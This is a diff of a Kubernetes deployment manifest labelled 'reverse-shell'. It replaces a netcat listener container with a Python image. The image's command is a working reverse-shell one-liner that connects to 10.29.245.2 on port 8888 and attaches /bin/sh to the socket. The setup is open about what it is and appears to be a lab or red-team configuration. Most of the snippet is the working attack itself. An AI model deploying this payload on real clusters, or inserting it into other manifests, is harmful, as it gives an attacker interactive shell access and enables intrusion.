@@ -13,8 +13,8 @@ spec:
         app: reverse-shell
     spec:
       containers:
-      - name: netcat
-        image: chilcano/netcat:jessie
+      - name: python
+        image: python:buster
         imagePullPolicy: Always
         ports:
         - containerPort: 8888
@@ -27,7 +27,7 @@ spec:
           allowPrivilegeEscalation: false
         stdin: true
         tty: true
-        command: ['/bin/nc', '-vvl', '1337', '-p', '8888']
+        command: ['/usr/bin/python', '-c', 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.29.245.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")']
         resources:
           requests:
             memory: "64Mi"
